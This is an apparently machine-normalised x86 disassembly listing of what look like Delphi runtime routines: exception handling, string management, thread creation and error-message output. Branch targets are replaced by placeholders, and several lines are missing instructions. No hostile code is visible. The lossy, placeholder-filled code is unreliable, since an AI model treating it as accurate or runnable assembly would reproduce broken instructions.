mov cx [ esi ]
add esi 0x2
mov eax [ eax ]
lea esi [ r-xdata ]
jmp r-xdata
add esi 0x6
mov bx [ esi ]
add esi ebx
dec ecx
jne r-xdata
mov eax esi
mov edx edi
pop edi
pop esi
pop ebx
jmp r-xdata
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44be14
pop esi
pop ebx
retn
cmp edx [ esi + 0x2 ]
je r-xdata
sub_4485fc
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x30 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x44 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
test bl 0x80
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
push eax
push edx
lea eax [ esi + 0x6 ]
call sub_448494
xor ecx ecx
test al al
pop edx
pop eax
je r-xdata
xor bl [ ecx + edx ]
test bl 0x80
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
jmp r-xdata
and bl 0xdf
jne r-xdata
mov eax [ esi ]
pop edx
add eax edx
dec ecx
jne r-xdata
sub_44866c
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_44bc1c
mov edx esp
mov eax ebx
call sub_4485fc
add esp 0x100
pop esi
pop ebx
retn
sub_448694
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_4486bd
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_4486ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_44871b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax [ ebp - 0x4 ]
pop [ fs : 0x0 ]
add esp 0x8
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_448764
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
xor edx edx
call sub_4474a8
pop esi
pop ebx
retn
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov esi [ rw-data ]
call [ esi + 0x4 ]
sub_4487bc
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_4487f8
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_44880c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_448820
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_448840
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_448820
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_4488a4
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_44806c
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_4015fc
push [ eax + 0x10 ]
mov [ eax + 0x10 ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_44880c
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_4487bc
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_4489d0
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_44806c
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_4487bc
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_4015fc
push [ eax + 0x10 ]
mov [ eax + 0x10 ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_4487f8
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x34 ]
cmp ecx [ edi - 0x34 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x30 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x38 ]
mov edx [ edi - 0x38 ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_447a74
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_448b58
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
push ebx
xor ebx ebx
push esi
push edi
push ebp
push ebp
push sub_448bd8
push [ fs : ebx ]
mov [ fs : ebx ] esp
mov ebx [ fs : ebx ]
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
push ebx
push eax
push edx
push ecx
mov edi [ esp + 0x34 ]
call sub_4015fc
push [ eax + 0x10 ]
mov [ eax + 0x10 ] esp
mov ecx [ edi + 0x4 ]
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] sub_448bd8
add ecx 0x5
call sub_448840
call ecx
call sub_4015fc
mov ecx [ eax + 0x10 ]
mov edx [ ecx ]
mov [ eax + 0x10 ] edx
add esp 0x14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_448bd8
jmp r-xdata
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_448840
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_448c38
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
mov eax esp
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax 0xd8
call sub_449288
jmp [ rw-data ]
push [ eax + 0x18 ]
push [ eax + 0x14 ]
push [ eax + 0x10 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
push 0x7
push [ eax ]
push eax
push edx
call sub_4475f4
mov ecx eax
pop edx
pop eax
test ecx ecx
je r-xdata
push ecx
push 0x1
push 0xeedfade
mov eax esp
call edx
add esp 0x30
mov ecx [ ecx + 0xc ]
sub_448ca8
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_4015fc
mov edx [ eax + 0x10 ]
mov ecx [ edx ]
mov [ eax + 0x10 ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_4481b0
call sub_4487a0
sub_448cfc
call sub_4015fc
mov edx [ eax + 0x10 ]
mov ecx [ edx ]
mov [ eax + 0x10 ] ecx
mov eax [ edx + 0x8 ]
call sub_4481b0
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_448868
jmp edx
sub_448d44
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
movzx eax al
mov edx [ edx + 0xc ]
call sub_447618
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_448de4
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
xor eax eax
retn
cmp [ rw-data ] 0x0
ja r-xdata
mov eax [ esp + 0x4 ]
cld
call sub_44806c
mov edx [ esp + 0x8 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov ebx [ esp + 0x4 ]
cmp [ ebx ] 0xeedfade
mov edx [ ebx + 0x14 ]
mov eax [ ebx + 0x18 ]
je r-xdata
lea eax [ esp + 0x4 ]
push eax
call UnhandledExceptionFilter
cmp eax 0x0
je r-xdata
call sub_448884
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov edx [ rw-data ]
test edx edx
je sub_448d44
mov ecx [ esp + 0x4 ]
mov eax 0xd9
mov edx [ ecx + 0x14 ]
mov [ esp ] edx
jmp sub_449288
call ecx
mov eax ebx
call edx
test eax eax
je sub_448d44
mov edx [ ebx + 0xc ]
sub_448e84
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_448eac
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ rw-data ]
mov edi [ eax + 0x4 ]
xor eax eax
push ebp
push sub_448ef5
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ rw-data ] ebx
mov esi [ edi + ebx * 8 + 0x4 ]
test esi esi
je r-xdata
test ebx ebx
jg r-xdata
call esi
sub_448f10
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_448f58
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44be28
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx 0x0
call sub_449f58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448f5f
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_448f64
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_448fa7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44be28
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_449f90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448fae
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_448fc8
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
call sub_448f10
jmp r-xdata
dec ecx
je r-xdata
add esi 0xc
dec edi
jne r-xdata
call sub_448f64
jmp r-xdata
dec ecx
je r-xdata
mov eax [ esi + 0x4 ]
mov eax [ eax + ebx ]
mov edx [ esi ]
add edx ebx
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
pop esi
pop edi
pop ebx
retn
call sub_448fb4
int3
sub_44900c
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_449050
push ebx
push esi
push edi
mov edi rw-data
mov bl 0x10
mov esi [ rw-data ]
mov eax esi
mov ecx 0xa
cdq
idiv ecx
add dl 0x30
movzx eax bl
mov [ edi + eax ] dl
mov ecx 0xa
mov eax esi
cdq
idiv ecx
mov esi eax
dec ebx
test esi esi
jne r-xdata
mov bl 0x1c
mov esi [ rw-data ]
mov eax esi
and eax 0xf
inc eax
mov edx [ rw-data ]
movzx eax [ edx + eax - 0x1 ]
movzx edx bl
mov [ edi + edx ] al
mov ecx 0x10
mov eax esi
xor edx edx
div ecx
mov esi eax
dec ebx
test esi esi
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_4490bc
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xc
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_4490ec
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call MessageBoxA
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1d
push rw-data
push 0xfffffff5
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call GetStdHandle
push eax
call WriteFile
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_44917c
push ebx
push esi
push edi
push ebp
mov esi rw-data
mov edi rw-data
cmp [ esi + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ esi + 0x28 ] 0x2
jne r-xdata
call sub_449050
call sub_4490ec
xor eax eax
mov [ rw-data ] eax
mov eax [ edi ]
mov ebx eax
xor eax eax
mov [ edi ] eax
call ebx
cmp [ edi ] 0x0
jne r-xdata
call sub_4475c0
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call sub_448eac
cmp [ esi + 0x28 ] 0x1
jbe r-xdata
mov eax ebx
call sub_4481b0
call sub_4475c0
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov ebp [ esi + 0x10 ]
test ebp ebp
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_448e84
cmp [ esi + 0x28 ] 0x1
jne r-xdata
mov eax ebp
call sub_44b868
mov eax [ esi + 0x10 ]
mov edi [ eax + 0x10 ]
mov eax [ esi + 0x10 ]
cmp edi [ eax + 0x4 ]
je r-xdata
cmp [ esi + 0x28 ] 0x0
je r-xdata
call [ esi + 0x24 ]
test edi edi
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
call sub_4490bc
push edi
call FreeLibrary
mov eax [ esi ]
push esi
mov edi esi
mov esi eax
mov ecx 0xc
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call ExitProcess
call [ rw-data ]
sub_449294
push ebp
mov ebp esp
call sub_44806c
push ebp
xor ecx ecx
push sub_448de4
mov edx [ fs : ecx ]
push edx
mov [ fs : ecx ] esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push ecx
push edx
call sub_4474a8
pop edx
pop eax
call edx
xor edx edx
pop ecx
mov [ fs : edx ] ecx
pop ecx
pop ebp
pop ebp
retn 0x4
sub_4492cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x8
call sub_44748c
mov [ eax ] ebx
mov [ eax + 0x4 ] esi
mov edx esi
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov [ rw-data ] 0x1
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax sub_449294
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call CreateThread
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_449348
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0xc ]
call sub_4474a8
pop eax
sub_44936c
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0xc ]
call sub_4474a8
sub_44939c
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
cmp [ edx - 0xa ] 0x1
je r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
mov ecx [ rw-data ]
jmp sub_449f58
[ edx - 0x8 ]
jne r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
movzx edx [ edx - 0xc ]
call sub_4493f8
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4476cc
pop edx
pop eax
jmp r-xdata
lea eax [ edx - 0xc ]
call sub_4474a8
sub_4493f8
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xe
jo r-xdata
jmp sub_448080
and eax 0xfffffffe
push edx
push eax
call sub_44748c
pop edx
pop ecx
mov [ edx + eax - 0x2 ] 0x0
add eax 0xc
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
test ecx ecx
jne r-xdata
mov edx ecx
mov [ eax - 0xc ] dx
mov [ eax - 0xa ] 0x1
retn
mov ecx [ rw-data ]
sub_449444
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
movzx edx [ ebp + 0x8 ]
call sub_4493f8
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_449348
mov [ ebx ] edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx eax
mov eax esi
call sub_4476cc
sub_44947c
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push 0x0
push esi
call WideCharToMultiByte
pop esi
pop ebp
retn 0x8
mov esi [ rw-data ]
sub_4494a8
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0xc ]
push eax
push ecx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call MultiByteToWideChar
pop ebp
retn 0x8
sub_44958c
xchg [ esp ] ecx
push ecx
xor ecx ecx
test edx edx
je r-xdata
jmp sub_449444
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_4495c0
xchg [ esp ] ecx
push ecx
xor ecx ecx
test edx edx
je r-xdata
jmp r-xdata
push edx
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
test edi edi
jg r-xdata
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
push edi
movzx eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
xor edx edx
xor eax eax
call sub_44947c
mov ebx eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_449910
test ebx ebx
jle r-xdata
mov eax esi
call sub_449348
jmp r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
mov eax esi
call sub_449348
push edi
movzx eax [ ebp + 0x8 ]
push eax
mov eax [ esi ]
mov ecx [ ebp - 0x4 ]
mov edx ebx
call sub_44947c
mov eax [ esi ]
sub eax 0xc
movzx edx [ ebp + 0x8 ]
mov [ eax ] dx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_449610
xchg [ esp ] ecx
push ecx
xor ecx ecx
test edx edx
je r-xdata
jmp r-xdata
mov ecx [ edx - 0x4 ]
shr ecx 0x1
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
test edi edi
jg r-xdata
push edi
movzx eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
xor edx edx
xor eax eax
call sub_44947c
mov ebx eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_449910
test ebx ebx
jle r-xdata
mov eax esi
call sub_449348
jmp r-xdata
mov eax esi
call sub_449348
push edi
movzx eax [ ebp + 0x8 ]
push eax
mov eax [ esi ]
mov ecx [ ebp - 0x4 ]
mov edx ebx
call sub_44947c
mov eax [ esi ]
sub eax 0xc
movzx edx [ ebp + 0x8 ]
mov [ eax ] dx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_449628
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4476cc
pop ebx
retn
mov ecx ebx
sub_44964c
test eax eax
je r-xdata
retn
push eax
xor ecx ecx
pop ecx
sub eax ecx
cmp cl [ eax + 0x1 ]
je r-xdata
inc eax
cmp cl [ eax + 0x2 ]
je r-xdata
inc eax
cmp cl [ eax + 0x3 ]
je r-xdata
inc eax
add eax 0x4
jmp r-xdata
cmp cl [ eax ]
je r-xdata
sub_449674
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_44939c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
jo r-xdata
jmp sub_448080
cmp esi ecx
je r-xdata
movzx ecx [ ecx - 0xc ]
call sub_449910
mov eax [ ebx ]
mov ecx edi
push 0x0
jmp r-xdata
movzx ecx [ ecx - 0xc ]
call sub_449910
mov eax esi
mov ecx [ esi - 0x4 ]
push 0x0
cmp [ esi - 0xa ] 0x1
je r-xdata
mov edx [ ebx ]
add edx edi
call sub_4476cc
mov eax esp
mov edx [ eax ]
test edx edx
je r-xdata
mov edx eax
mov eax esp
call sub_44939c
mov eax [ esp ]
mov ecx [ eax - 0x4 ]
pop eax
pop edi
pop esi
pop ebx
retn
call sub_449348
sub_4496f0
test edx edx
je r-xdata
mov edx ecx
jmp sub_44939c
test ecx ecx
je sub_44939c
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_449674
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
jo r-xdata
push eax
push ecx
call sub_44939c
pop edx
pop eax
jmp sub_449674
jmp sub_448080
movzx edx [ esi - 0xc ]
call sub_4493f8
mov edi eax
push 0x0
cmp [ ebx - 0xa ] 0x1
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_4476cc
cmp [ esi - 0xa ] 0x1
je r-xdata
mov edx ebx
mov eax esp
call sub_44939c
mov eax esp
call sub_4494c4
mov ebx [ esp ]
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_4476cc
mov eax [ esp ]
test eax eax
je r-xdata
mov edx esi
mov eax esp
call sub_44939c
mov esi [ esp ]
pop eax
pop eax
mov edx edi
test edi edi
je r-xdata
mov eax esp
call sub_449348
call sub_44939c
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_4497bc
cmp eax edx
je r-xdata
retn
test eax edx
je r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
cmp [ eax - 0xa ] 0x1
je r-xdata
cmp eax [ edx - 0x4 ]
retn
test edx edx
jne r-xdata
cmp [ edx - 0xa ] 0x1
je r-xdata
push edx
mov edx eax
mov eax esp
mov ecx [ rw-data ]
call sub_449f58
pop edx
mov eax [ esp ]
cmp [ eax - 0x4 ] edx
retn
movzx ecx [ eax ]
sub cl [ edx ]
jne r-xdata
push eax
lea eax [ esp + 0x4 ]
mov ecx [ rw-data ]
call sub_449f58
pop eax
mov edx [ esp + 0x4 ]
mov eax esp
mov edx 0x2
pushf
mov ecx [ eax ]
or ecx [ eax + 0x4 ]
je r-xdata
push ebx
mov ebx [ eax - 0x4 ]
sub ebx [ edx - 0x4 ]
push ebx
adc ecx 0xffffffff
and ecx ebx
sub ecx [ eax - 0x4 ]
sub eax ecx
sub edx ecx
popf
pop eax
pop eax
call sub_44936c
bsf ebx ebx
shr ebx 0x3
add ecx ebx
jns r-xdata
add ecx 0x4
js r-xdata
pop eax
add eax eax
pop ebx
mov al [ ecx + eax ]
cmp al [ ecx + edx ]
pop ebx
pop ebx
jmp r-xdata
mov ebx [ ecx + eax ]
xor ebx [ ecx + edx ]
jne r-xdata
sub_4498a8
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx - 0xa ] 0x1
je r-xdata
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push eax
call sub_4494c4
